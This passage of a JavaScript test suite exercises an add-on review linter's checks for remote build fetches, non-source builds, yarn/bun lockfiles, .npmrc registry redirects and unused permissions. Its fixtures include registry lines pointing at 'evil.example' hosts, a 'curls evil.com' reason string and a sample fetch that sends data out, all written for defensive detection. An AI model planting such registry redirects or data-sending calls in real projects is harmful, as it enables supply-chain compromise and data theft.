  buildInstructions: "",
  unresolved: [],
  analyzed: true,
  anchor: "package.json",
  ...over,
});

// undeclared-build-source (mission 1): "remote-fetch" -> error; the offline/unresolved
// fallback -> manual escalation; classifications owned elsewhere / clean / none -> nothing.
test("undeclared-build-source: remote-fetch -> error, offline/unresolved -> manual, else silent", () => {
  const rf = undeclaredBuildSource.run(
    buildCtx(
      review({ classification: "remote-fetch", reason: "curls evil.com" })
    )
  );
  assert.equal(rf.findings.length, 1);
  assert.equal(rf.findings[0].file, "package.json");
  assert.equal(rf.findings[0].data.explanation, "curls evil.com");
  assert.ok(!rf.escalations?.length);

  // offline (analyzed:false, classification null) -> one manual escalation, no finding.
  const off = undeclaredBuildSource.run(
    buildCtx(
      review({
        classification: null,
        analyzed: false,
        buildInstructions: "npm ci && npm run build",
      })
    )
  );
  assert.equal(off.findings.length, 0);
  assert.equal(off.escalations.length, 1);
  assert.equal(
    off.escalations[0].data.buildInstructions,
    "npm ci && npm run build"
  );

  // analyzed ok BUT a step the linter could not bound -> still manual.
  const unr = undeclaredBuildSource.run(
    buildCtx(review({ unresolved: [{ kind: "tool", detail: "make" }] }))
  );
  assert.equal(unr.escalations.length, 1);
  assert.match(unr.escalations[0].data.unresolvedBuildSteps, /make/);

  // clean ok, nothing unresolved -> nothing.
  assert.deepEqual(undeclaredBuildSource.run(buildCtx(review())), {
    findings: [],
  });
  // owned by the other check / no build / no buildReview -> nothing.
  for (const c of ["not-from-source", "none"]) {
    assert.deepEqual(
      undeclaredBuildSource.run(
        buildCtx(review({ classification: c, analyzed: c !== "none" }))
      ),
      { findings: [] }
    );
  }
  assert.deepEqual(undeclaredBuildSource.run({ addon: { files: new Map() } }), {
    findings: [],
  });
});

// build-not-from-source (mission 2): fires ONLY on "not-from-source".
test("build-not-from-source fires only on the not-from-source classification", () => {
  const hit = buildNotFromSource.run(
    buildCtx(
      review({ classification: "not-from-source", reason: "just zips dist/" })
    )
  );
  assert.equal(hit.length, 1);
  assert.equal(hit[0].data.explanation, "just zips dist/");
  for (const c of ["ok", "remote-fetch", "none", null]) {
    assert.deepEqual(
      buildNotFromSource.run(buildCtx(review({ classification: c }))),
      []
    );
  }
});

// The SCA summary split partitions the recheck CONSUMERS by their producer's corpus:
// input:source producers read the source, input:xpi producers read the built XPI. Each
// consumer bridges only to the summary of its own corpus.
test("recheckConsumersByCorpus partitions consumers by their producer's input", () => {
  const { source, xpi } = loadRegistry().recheckConsumersByCorpus();
  // source-anchored (producer input: source)
  assert.ok(source.has("data-exfiltration-recheck"));
  assert.ok(source.has("disguised-transmission-recheck"));
  assert.ok(source.has("unused-permission-recheck"));
  // XPI-anchored (producer input: xpi)
  assert.ok(xpi.has("unused-files-recheck"));
  assert.ok(xpi.has("minimize-web-accessible-resources-recheck"));
  assert.ok(xpi.has("missing-english-localization-recheck"));
  // disjoint
  assert.equal([...source].filter((c) => xpi.has(c)).length, 0);
});

// In SCA the summary runs once per corpus, so a source-anchored recheck (data-exfiltration,
// input: source) bridges to the source summary: its unsure sites divert to the recheck bucket
// like any other producer, rather than routing straight to manual review.
test("SCA diverts a source-anchored recheck to the summary", async () => {
  const mk = (obj) =>
    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
  const manifest = { manifest_version: 3, background: { scripts: ["bg.js"] } };
  // A remote fetch carrying a body -> data-exfiltration escalates it (ambiguous consent).
  const addon = {
    files: mk({
      "manifest.json": JSON.stringify(manifest),
      "bg.js": `const data = "x";\nfetch("https://api.example.com/", { body: data });`,
    }),
    manifest,
  };
  const ctx = withManifest({
    addon,
    jsSources: parsedSources(addon, { schema }),
    schema,
    mode: REVIEW_MODE.SCA,
    options: {},
    // The per-site adjudication returns unsure, so the site becomes a manual item the
    // divert then routes.
    llm: {
      evaluate: async (req) =>
        new Map(req.candidates.map((c) => [c.id, { verdict: VERDICT.UNSURE }])),
      // runChecks now also runs the add-on summary; benign stubs keep it from erroring
      // (the divert this test asserts on happens in the main loop, before the summary).
      reviewAddon: async () => ({ summary: "", recheck: [] }),
      summarize: async () => "",
    },
  });
  const out = await runChecks(ctx, loadRegistry(), {
    only: ["data-exfiltration"],
    recheckActive: true,
  });
  // Diverted to the summary (source corpus), not left in manual review.
  assert.ok(
    ctx.recheck?.get("data-exfiltration-recheck")?.length,
    "the exfiltration site is handed to the recheck consumer in SCA"
  );
  assert.ok(!out.manualItems.some((m) => m.file === "bg.js"));
});

// ---- unsupported-build-tool (SCA deterministic: npm/pnpm only) ----

// A committed yarn/bun fingerprint - a lockfile or the package.json "packageManager"
// field - is a hard reject: the offending tool is the finding's item, anchored at the
// fingerprint file. npm/pnpm (or no evidence) is clean.
test("unsupported-build-tool rejects yarn/bun by lockfile or packageManager field", () => {
  const run = (obj) =>
    unsupportedBuildTool.run({
      addon: {
        files: new Map(
          Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])
        ),
      },
    });
  const one = (out, tool, file) => {
    assert.equal(out.length, 1);
    assert.equal(out[0].item, tool);
    assert.equal(out[0].file, file);
  };
  one(run({ "yarn.lock": "" }), "yarn", "yarn.lock");
  one(run({ "bun.lockb": "" }), "bun", "bun.lockb");
  one(run({ "bunfig.toml": "" }), "bun", "bunfig.toml");
  one(
    run({ "package.json": '{"packageManager":"yarn@4.1.0"}' }),
    "yarn",
    "package.json"
  );
  // npm/pnpm and no-evidence are clean.
  assert.deepEqual(
    run({
      "package.json": '{"packageManager":"pnpm@9"}',
      "pnpm-lock.yaml": "",
    }),
    []
  );
  assert.deepEqual(
    run({ "package.json": "{}", "package-lock.json": "{}" }),
    []
  );
  assert.deepEqual(
    unsupportedBuildTool.run({ addon: { files: new Map() } }),
    []
  );
});

// ---- build-registry-redirect (SCA deterministic: .npmrc registry) ----

// ANY registry= / @scope:registry= in .npmrc is a hard reject (a legit build never sets
// the registry) - the raw value is the item, anchored at the line; the value is not
// parsed. Auth lines, comments, unrelated keys, and no .npmrc are clean.
test("build-registry-redirect rejects any registry setting in .npmrc", () => {
  const run = (npmrc) =>
    buildRegistryRedirect.run({
      addon: { files: new Map([[".npmrc", Buffer.from(npmrc)]]) },
    });
  const one = (out, item) => {
    assert.equal(out.length, 1);
    assert.equal(out[0].item, item);
    assert.equal(out[0].file, ".npmrc");
    assert.equal(out[0].loc.line, 1);
  };
  one(run("registry=https://evil.example/"), "https://evil.example/");
  one(
    run("@acme:registry=https://npm.pkg.github.com"),
    "https://npm.pkg.github.com"
  );
  one(run("registry=${NPM_REG}"), "${NPM_REG}");
  // npm's `[]` array-append syntax sets the same registry config -> also rejected;
  // `registry[0]=` is NOT honored by npm, so it stays clean.
  one(run("registry[]=https://evil/"), "https://evil/");
  one(run("@acme:registry[]=https://x/"), "https://x/");
  assert.deepEqual(run("registry[0]=https://evil/"), []);
  // Even the public registry, a quoted value, and an uppercase key are rejected - the
  // value is never parsed, so nothing slips past on host/quote/case.
  assert.equal(run("registry=https://registry.npmjs.org/").length, 1);
  assert.equal(run('registry="https://registry.npmjs.org/"').length, 1);
  assert.equal(run("REGISTRY=https://evil/").length, 1);
  // Auth lines, comments, unrelated keys, and no .npmrc are clean.
  assert.deepEqual(run("//registry.npmjs.org/:_authToken=abc"), []);
  assert.deepEqual(run("# registry=https://evil/"), []);
  assert.deepEqual(run("save-exact=true"), []);
  assert.deepEqual(
    buildRegistryRedirect.run({ addon: { files: new Map() } }),
    []
  );
});

// A disallowed fingerprint is matched at ANY depth (a build run from a subfolder), by
// basename - not just at the root.
test("unsupported-build-tool detects nested lockfiles + packageManager", () => {
  const run = (obj) =>
    unsupportedBuildTool.run({
      addon: {
        files: new Map(
          Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])
        ),
      },
    });
  const nested = run({
    "frontend/yarn.lock": "",
    "frontend/package.json": "{}",
  });
  assert.equal(nested.length, 1);
  assert.equal(nested[0].item, "yarn");
  assert.equal(nested[0].file, "frontend/yarn.lock");
  const pm = run({ "app/package.json": '{"packageManager":"bun@1"}' });
  assert.equal(pm[0].item, "bun");
  assert.equal(pm[0].file, "app/package.json");
  // A nested npm build is clean.
  assert.deepEqual(
    run({ "frontend/package.json": "{}", "frontend/package-lock.json": "{}" }),
    []
  );
});

// Nested .npmrc (a build that runs from a subfolder) is scanned too; the reject is on
// the mere presence of the registry key, not its value.
test("build-registry-redirect scans nested .npmrc and rejects any registry key", () => {
  const at = (path, npmrc) =>
    buildRegistryRedirect.run({
      addon: { files: new Map([[path, Buffer.from(npmrc)]]) },
    });
  const nested = at("frontend/.npmrc", "registry=https://evil.example/");
  assert.equal(nested.length, 1);
  assert.equal(nested[0].file, "frontend/.npmrc");
  assert.equal(nested[0].item, "https://evil.example/");
  // The public registry, a scoped registry, and an uppercase key are all rejected.
  assert.equal(at(".npmrc", "registry=https://registry.npmjs.org/").length, 1);
  assert.equal(at(".npmrc", "@a:registry=https://x/").length, 1);
  assert.equal(at(".npmrc", "REGISTRY=https://evil/").length, 1);
});

// ---- committed-node-modules (SCA deterministic: no committed node_modules) ----

// Each node_modules directory the loader recorded (never read) becomes an error finding
// anchored at that directory; none recorded -> no finding.
test("committed-node-modules flags each recorded node_modules directory", () => {
  const run = (nodeModules) =>
    committedNodeModules.run({ addon: { nodeModules } });
  const out = run(["node_modules", "packages/a/node_modules"]);
  assert.equal(out.length, 2);
  assert.deepEqual(
    out.map((f) => f.item),
    ["node_modules", "packages/a/node_modules"]
  );
  assert.equal(out[0].file, "node_modules");
  // None recorded, or no addon -> no finding.
  assert.deepEqual(run([]), []);
  assert.deepEqual(committedNodeModules.run({}), []);
});

// ---- manual-checks diff gate (the "Forked add-on" reminder) ----
// "Forked add-on" is now a manual-checks entry marked diff: false, so it shows
// only for a new submission, not when reviewing against a --diff-to baseline. An
// ungated manual-checks entry (e.g. the spam check) shows in both modes.
test("manualChecks gates diff:false entries to new submissions", () => {
  const reg = loadRegistry();
  const titles = (inDiff) => reg.manualChecks(inDiff).map((m) => m.title);
  assert.ok(titles(false).includes("Forked add-on")); // new submission
  assert.ok(!titles(true).includes("Forked add-on")); // diff review excludes it
  assert.ok(titles(false).includes("Check the submission for spam"));
  assert.ok(titles(true).includes("Check the submission for spam"));
});

// Every manual-checks entry carries a `check:` id (id metadata, not a runnable
// check): the ids are present on all entries, unique, do not collide with the
// rule-backed checkIds(), and each has a matching docs/checks/<id>.html page - so
// the docs reference real registry ids, not invented ones.
test("manual checks have unique, doc-backed check ids distinct from rule ids", () => {
  const reg = loadRegistry();
  const manualIds = reg.manualCheckIds();
  const manualTitles = reg.manualChecks(false).concat(reg.manualChecks(true));
  // One id per manual-checks entry (the diff:false "Forked add-on" included).
  assert.equal(manualIds.length, 10);
  assert.equal(new Set(manualIds).size, manualIds.length, "ids are unique");
  // Manual ids are NOT in the runnable check namespace (no rule module).
  const runnable = new Set(reg.checkIds());
  for (const id of manualIds) {
    assert.ok(!runnable.has(id), `manual id ${id} collides with a rule id`);
  }
  // Each manual id has a documentation page (registry <-> docs stay in sync).
  const docDir = path.join(here, "..", "..", "docs", "checks");
  for (const id of manualIds) {
    assert.ok(
      fs.existsSync(path.join(docDir, `${id}.html`)),
      `missing docs/checks/${id}.html`
    );
  }
  // Sanity: the diff:false fork check is one of them.
  assert.ok(manualIds.includes("forked-add-on"));
  assert.ok(manualTitles.length > 0);
});

// ---- unused-permission (producer of permissions to vet) ----
// It always enumerates the declared NAMED permissions a reachable API call does
// not provably require, one escalation each (anchored to the manifest line); host
// match patterns are skipped. When --llm-review runs the orchestrator hands
// these to the unused-permission-recheck recheck consumer; otherwise they auto-group into
// the by-hand reminder.
test("unused-permission lists the unprovable declared named permissions", () => {
  const manifest = {
    permissions: ["tabs", "https://example.com/*"],
    optional_permissions: ["storage"],
    // >= 154 so the post-D308076 producer (this module) enumerates.
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    // No API usages -> nothing is provably used -> every named permission is
    // still escalated for the reviewer (the host match pattern is skipped).
    apiUsages: [],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx));
  assert.equal(out.findings.length, 0);
  assert.deepEqual(out.escalations.map((e) => e.item).sort(), [
    "storage",
    "tabs",
  ]);
  assert.ok(out.escalations.every((e) => e.file === "manifest.json"));
});

// The producer's deterministic verdict: a permission whose linked prompt entries
// (check.recheck.permissionPrompts) declare usage tokens that appear nowhere in
// the LIVE code (comments excluded) or manifest is unused - a finding, never an
// escalation. Everything the tokens cannot decide keeps escalating: a found
// token, an entry without tokens (unlimitedStorage), or no entry at all.
// Shaped exactly like production LoadedCheck.recheckData (recheckDataFor):
// token entries only, no consumer entry or prose.
const PERMISSION_TOKEN_RECHECK = {
  permissionPrompts: [
    {
      permissions: ["compose"],
      tokens: [
        "tabs.executeScript",
        "tabs.insertCSS",
        "scripting.executeScript",
        "scripting.insertCSS",
      ],
      minStrictVersion: null,
      maxStrictVersion: null,
    },
    {
      permissions: ["cookies"],
      tokens: ["cookieStoreId"],
      minStrictVersion: null,
      maxStrictVersion: null,
    },
    {
      permissions: ["unlimitedStorage"],
      tokens: [],
      minStrictVersion: null,
      maxStrictVersion: null,
    },
  ],
};

test("unused-permission decides token-absent permissions deterministically", () => {
  const manifest = {
    manifest_version: 2,
    permissions: ["compose", "cookies", "storage", "unlimitedStorage"],
    background: { scripts: ["bg.js"] },
  };
  // "compose" uses dotted (api-resolved) injection tokens, and there is no resolved
  // tabs.*/scripting.* injection call here (the comment names tabs.executeScript, but a
  // comment is never a call, and apiUsages is empty), so compose is deterministically
  // unused. The bare "cookieStoreId" token in live code grounds "cookies" via the atom
  // scan. Extraction populates codeAtoms (the comment-free atoms) on the authored source.
  const code = [
    "// tabs.executeScript(1, { file: 'x.js' }) would need a permission",
    "browser.tabs.create({ url: 'a.html', cookieStoreId: store });",
  ].join("\n");
  const jsSources = [{ file: "bg.js", code, lineOffset: 0 }];
  runExtractionPass(jsSources, { schema });
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from(code)],
      ]),
    },
    jsSources,
    apiUsages: [],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    recheckData: PERMISSION_TOKEN_RECHECK,
  });
  assert.deepEqual(
    out.findings.map((f) => f.item),
    ["compose"]
  );
  assert.deepEqual(out.escalations.map((e) => e.item).sort(), [
    "cookies",
    "storage",
    "unlimitedStorage",
  ]);
  // cookies escalated because its token is PRESENT in live code but not API-grounded:
  // the located site rides along so the recheck can judge it per occurrence.
  assert.deepEqual(
    out.escalations.find((e) => e.item === "cookies").occurrences,
    [{ id: "cookies#1", file: "bg.js", line: 2, token: "cookieStoreId" }]
  );
  // A token-less permission (unlimitedStorage) escalates holistically - no sites. A
  // permission with no prompt entry (storage) likewise has no tokens, so no sites.
  assert.deepEqual(
    out.escalations.find((e) => e.item === "unlimitedStorage").occurrences,
    []
  );
  assert.deepEqual(
    out.escalations.find((e) => e.item === "storage").occurrences,
    []
  );
});

// The NON-AUTHORED bundle path for a BARE token: a vendored bundle has no codeAtoms, so
// its raw text is scanned line by line (with its lineOffset applied).
test("unused-permission locates a bare token in a non-authored bundle (raw scan)", () => {
  const manifest = { manifest_version: 2, permissions: ["cookies"] };
  const bundle = "// vendored\nvar a = opts.cookieStoreId;";
  const jsSources = [{ file: "lib.js", code: bundle, lineOffset: 5 }];
  runExtractionPass(jsSources, { schema, nonAuthored: new Set(["lib.js"]) });
  const ctx = {
    schema,
    jsSources,
    apiUsages: [],
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["lib.js", Buffer.from(bundle)],
      ]),
    },
  };
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    recheckData: PERMISSION_TOKEN_RECHECK,
  });
  // cookieStoreId located in the non-authored bundle via the raw-line scan, lineOffset
  // applied (source line 2 + offset 5).
  assert.deepEqual(
    out.escalations.find((e) => e.item === "cookies").occurrences,
    [{ id: "cookies#1", file: "lib.js", line: 7, token: "cookieStoreId" }]
  );
});

// DOTTED (namespace-qualified) injection tokens are resolved against the api-usage
// analysis, not the text scan: only a real tabs.*/scripting.* CALL counts. This is both
// the noise reduction (a bare identifier, a property read on a local, and a comment do
// NOT match) and the tabs-vs-scripting precision. It also covers the split dispatch
// (compose's dotted tokens via api-usage AND cookies' bare token via the atom scan in one
// run) and the per-line dedup (two injection calls on one line collapse to one site).
test("unused-permission resolves dotted injection tokens via api-usage; bare tokens via atoms", () => {
  const manifest = {
    manifest_version: 3,
    permissions: ["compose", "messagesModify", "activeTab", "cookies"],
    background: { scripts: ["bg.js"] },
  };
  const code = [
    "// browser.tabs.executeScript(x) in a comment must NOT count", // line 1
    "browser.tabs.executeScript(t, { code: 'a' });", // line 2 -> tabs.executeScript
    "messenger.scripting.insertCSS(t, { css: 'b' });", // line 3 -> scripting.insertCSS
    "const bare = executeScript;", // line 4 -> bare identifier, NOT a call
    "function f(tab) { return tab.executeScript; }", // line 5 -> property on a local, NOT a call
    "browser.tabs.executeScript(a); browser.scripting.executeScript(b);", // line 6 -> two calls, one line
    "const c = obj.cookieStoreId;", // line 7 -> bare token (cookies), atom scan
  ].join("\n");
  const jsSources = [{ file: "bg.js", code, lineOffset: 0 }];
  runExtractionPass(jsSources, { schema });
  const ctx = withManifest({
    schema,
    jsSources,
    apiUsages: [{ file: "bg.js", ...apiUsageOf(jsSources[0]) }],
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from(code)],
      ]),
    },
  });
  const recheckData = {
    permissionPrompts: [
      ...["compose", "messagesModify", "activeTab"].map((p) => ({
        permissions: [p],
        tokens: [
          "tabs.executeScript",
          "tabs.insertCSS",
          "scripting.executeScript",
          "scripting.insertCSS",
        ],
        minStrictVersion: null,
        maxStrictVersion: null,
      })),
      {
        permissions: ["cookies"],
        tokens: ["cookieStoreId"],
        minStrictVersion: null,
        maxStrictVersion: null,
      },
    ],
  };
  const out = unusedPermissionProducer.run(ctx, { recheckData });
  const linesOf = (perm) =>
    out.escalations
      .find((e) => e.item === perm)
      .occurrences.map((o) => o.line)
      .sort((a, b) => a - b);
  // Only the resolved injection CALLS (lines 2, 3, and 6 - deduped to one) count; the
  // comment (1), bare identifier (4), and local property read (5) contribute nothing.
  for (const p of ["compose", "messagesModify", "activeTab"]) {
    assert.deepEqual(linesOf(p), [2, 3, 6], p);
    // every injection occurrence carries a dotted (namespace-qualified) token.
    assert.ok(
      out.escalations
        .find((e) => e.item === p)
        .occurrences.every((o) => o.token.includes(".")),
      `${p} occurrences are dotted`
    );
  }
  // Bare token still resolved via the atom scan, in the SAME run (split dispatch).
  assert.deepEqual(
    out.escalations.find((e) => e.item === "cookies").occurrences,
    [{ id: "cookies#1", file: "bg.js", line: 7, token: "cookieStoreId" }]
  );
});

// The compose_scripts manifest key requires compose (the required_permissions
// annotation the local extensionScripts.json overlay adds to the key). Declaring
// the key grounds compose as USED, so it is dropped outright - neither a
// deterministic-unused finding nor a manual escalation. This is the schema-driven
// grounding, not the token pre-flight.
test("unused-permission grounds compose from the compose_scripts manifest key", () => {
  const manifest = {
    manifest_version: 2,
    permissions: ["compose"],
    compose_scripts: [{ js: ["c.js"] }],
  };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    recheckData: PERMISSION_TOKEN_RECHECK,
  });
  assert.equal(out.findings.length, 0);
  assert.deepEqual(out.escalations, []);
});

// message_display_scripts requires messagesModify always, plus scripting before
// Thunderbird 154 (a version-bounded required_permissions entry). The grounding
// version-filters by the add-on's strict_min_version, so the scripting requirement
// only applies below 154.
test("message_display_scripts version-filters scripting on the 154 boundary", () => {
  const run = (strict_min_version) => {
    const manifest = {
      manifest_version: 3,
      permissions: [],
      message_display_scripts: [{ js: ["c.js"] }],
      browser_specific_settings: { gecko: { strict_min_version } },
    };
    const ctx = withManifest({
      schema,
      addon: {
        manifest,
        files: new Map([
          ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ]),
      },
      apiUsages: [],
    });
    return missingPermission.run(ctx).map((f) => f.item);
  };
  // Before 154: both messagesModify AND scripting are required (undeclared -> missing).
  const pre = run("128.0");
  assert.ok(pre.includes("messagesModify"));
  assert.ok(pre.includes("scripting"));
  // 154+: only messagesModify is required; scripting is out of bounds.
  const post = run("154.0");
  assert.ok(post.includes("messagesModify"));
  assert.ok(!post.includes("scripting"));
});

// The deterministic path disables itself whenever the scan cannot see every
// usage: unresolved API surface (apiUsage limitations / dynamic member tails
// could spell a gated call without its token) and SCA mode (build-time
// dependencies are invisible in the source corpus). Everything escalates then.
test("unused-permission escalates instead of deciding when the scan is blind", () => {
  const manifest = {
    manifest_version: 2,
    permissions: ["compose"],
  };
  const base = () => ({
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  });
  // Decidable baseline: tokens absent -> finding.
  const decided = unusedPermissionProducer.run(withManifest(base()), {
    recheckData: PERMISSION_TOKEN_RECHECK,
  });
  assert.equal(decided.findings.length, 1);
  // A dynamic member tail (browser.tabs[m]) -> blind -> escalate.
  const dynamic = base();
  dynamic.apiUsages = [
    {
      file: "bg.js",
      usages: [{ segments: ["tabs"], dynamicTail: true, line: 1, column: 0 }],
      limitations: [],
    },
  ];
  const dyn = unusedPermissionProducer.run(withManifest(dynamic), {
    recheckData: PERMISSION_TOKEN_RECHECK,
  });
  assert.equal(dyn.findings.length, 0);
  assert.deepEqual(
    dyn.escalations.map((e) => e.item),
    ["compose"]
  );
  // An unresolved-alias limitation -> blind -> escalate.
  const limited = base();
  limited.apiUsages = [
    {
      file: "bg.js",
      usages: [],
      limitations: [{ line: 1, column: 0, reason: "aliased/destructured" }],
    },
  ];
  assert.equal(
    unusedPermissionProducer.run(withManifest(limited), {
      recheckData: PERMISSION_TOKEN_RECHECK,
    }).findings.length,
    0
  );
  // SCA mode -> the source corpus cannot prove the shipped add-on -> escalate.
  const sca = base();
  sca.mode = REVIEW_MODE.SCA;
  assert.equal(
    unusedPermissionProducer.run(withManifest(sca), {
      recheckData: PERMISSION_TOKEN_RECHECK,
    }).findings.length,
    0
  );
});

// A matched entry WITHOUT tokens declares its usages token-undetectable, so it
// poisons its permissions to undecidable even when another matched entry
// contributes tokens for the same permission. A version-EXCLUDED token-less
// entry does not apply and must NOT poison.
test("unused-permission: a version-excluded token-less entry does not poison", () => {
  const manifest = {
    manifest_version: 2,
    permissions: ["compose"],
    browser_specific_settings: { gecko: { strict_min_version: "128.0" } },
  };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
  const recheckData = {
    permissionPrompts: [
      ...PERMISSION_TOKEN_RECHECK.permissionPrompts,
      // Applies only from 154 on - out of bounds for this add-on, so its
      // token-lessness is irrelevant and compose stays decidable.
      {
        permissions: ["compose"],
        tokens: [],
        minStrictVersion: "154",
        maxStrictVersion: null,
      },
    ],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx), { recheckData });
  assert.deepEqual(
    out.findings.map((f) => f.item),
    ["compose"]
  );
});

test("unused-permission: a token-less entry poisons its permissions", () => {
  const manifest = { manifest_version: 2, permissions: ["compose"] };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
  const recheck = {
    permissionPrompts: [
      ...PERMISSION_TOKEN_RECHECK.permissionPrompts,
      {
        permissions: ["compose"],
        tokens: [],
        minStrictVersion: null,
        maxStrictVersion: null,
      },
    ],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    recheckData: recheck,
  });
  assert.equal(out.findings.length, 0);
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["compose"]
  );
});

// The token lists are version-bound like the prompts they ride on: an entry
// whose bounds exclude the add-on's strict_min_version contributes no tokens,
// so the permission stays undecidable and escalates.
test("unused-permission selects token lists by strict_min_version", () => {
  const recheck = {
    permissionPrompts: [
      {
        permissions: ["compose"],
        tokens: ["executeScript"],
        minStrictVersion: "154",
        maxStrictVersion: null,
      },
    ],
  };
  const run = (strictMin) => {
    const manifest = {
      manifest_version: 2,
      permissions: ["compose"],
      browser_specific_settings: { gecko: { strict_min_version: strictMin } },
    };
    const ctx = {
      schema,
      addon: {
        manifest,
        files: new Map([
          ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ]),
      },
      apiUsages: [],
    };
    return unusedPermissionProducer.run(withManifest(ctx), {
      recheckData: recheck,
    });
  };
  // In bounds: the tokens apply, executeScript is absent -> deterministic.
  assert.deepEqual(
    run("154.0").findings.map((f) => f.item),
    ["compose"]
  );
  // Out of bounds: no matching entry -> undecidable -> escalates.
  assert.deepEqual(
    run("128.0").escalations.map((e) => e.item),
    ["compose"]
  );
});

// The deterministic analysis is authoritative: a permission a reachable API call
// provably requires (here messagesRead, via messages.get) is dropped here, so it
// never reaches the reviewer or the recheck consumer. Only the unprovable rest
// (messagesUpdate) is escalated.
test("unused-permission drops permissions proved used by static analysis", () => {
  const manifest = {
    manifest_version: 3,
    permissions: ["messagesRead", "messagesUpdate"],
    background: { scripts: ["bg.js"] },
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const notes = [];
  const ctx = {
    schema,
    note: (file, loc, item, verdict) => notes.push({ item, verdict }),
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from("")],
      ]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [{ segments: ["messages", "get"], line: 1, column: 0 }],
      },
    ],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx));
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["messagesUpdate"] // messagesRead is gated out (provably used)
  );
  // The override is recorded as a pass note, so the feed shows it was dropped.
  assert.deepEqual(
    notes.find((n) => n.item === "messagesRead"),
    { item: "messagesRead", verdict: VERDICT.PASS }
  );
});

// FUNCTION-level permissions are credited too, not just namespace-level ones: a
// messages.archive call proves messagesMove and messages.delete proves messagesDelete,
// so neither is flagged unused. This is the credit path the shim/wrapper fix relies on
// (the parser resolving a captured-namespace call to these segments is covered in
// api-usage.test.js; here it is driven from the already-resolved segments).
test("unused-permission credits function-level permissions (archive/delete)", () => {
  const manifest = {
    manifest_version: 3,
    permissions: ["messagesRead", "messagesMove", "messagesDelete"],
    background: { scripts: ["bg.js"] },
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const ctx = withManifest({
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from("")],
      ]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          { segments: ["messages", "archive"], line: 1, column: 0 },
          { segments: ["messages", "delete"], line: 2, column: 0 },
        ],
      },
    ],
  });
  const out = unusedPermissionProducer.run(ctx);
  // archive -> messagesMove, delete -> messagesDelete, both -> messagesRead: none left.
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    []
  );
  const analysis = getPermissionAnalysis(ctx);
  assert.ok(analysis.usedPermissions.has("messagesMove"));
  assert.ok(analysis.usedPermissions.has("messagesDelete"));
});

// A permission that gates no callable API (unlimitedStorage) can never be proved
// used by static analysis. It is no longer hand-exempt: it escalates like any other
// not-provably-used permission, to be re-judged by the LLM recheck (the registry
// grounds it on whether the add-on persists data) or reviewed by hand.
test("unused-permission escalates unlimitedStorage (gates no API)", () => {
  const manifest = {
    permissions: ["unlimitedStorage", "tabs"],
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const notes = [];
  const ctx = {
    schema,
    note: (file, loc, item, verdict) => notes.push({ item, verdict }),
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx));
  // Both escalate now; nothing is hand-exempt.
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["unlimitedStorage", "tabs"]
  );
  assert.deepEqual(
    notes.find((n) => n.item === "unlimitedStorage"),
    {
      item: "unlimitedStorage",
      verdict: VERDICT.UNSURE,
    }
  );
});

// ---- unused-permission-recheck (recheck consumer) ----
// Given the items handed to it (ctx.recheck) and the summary's verdicts
// (ctx.addon.recheck), it aggregates per permission: fail -> a warning finding on the
// permission's manifest line, pass -> dropped, unsure -> a manual-review escalation.
// The finding/manual are deliberately reason-free (the model's reasons live only in
// the AI summary). These items carry no located sites, so each is judged holistically
// (keyed by the permission itself). The aggregation is resolvePermissionRecheck (see
// recheck.test.js); this confirms the module is wired to it.
test("unused-permission-recheck maps the summary's recheck verdicts to findings + escalations", () => {
  const check = { id: "unused-permission-recheck" };
  const ctx = {
    recheck: new Map([
      [
        "unused-permission-recheck",
        [
          {
            ruleId: "unused-permission",
            item: "tabs",
            file: "manifest.json",
            loc: { line: 4 },
          },
          {
            ruleId: "unused-permission",
            item: "downloads",
            file: "manifest.json",
            loc: { line: 5 },
          },
          {
            ruleId: "unused-permission",
            item: "storage",
            file: "manifest.json",
            loc: { line: 6 },
          },
        ],
      ],
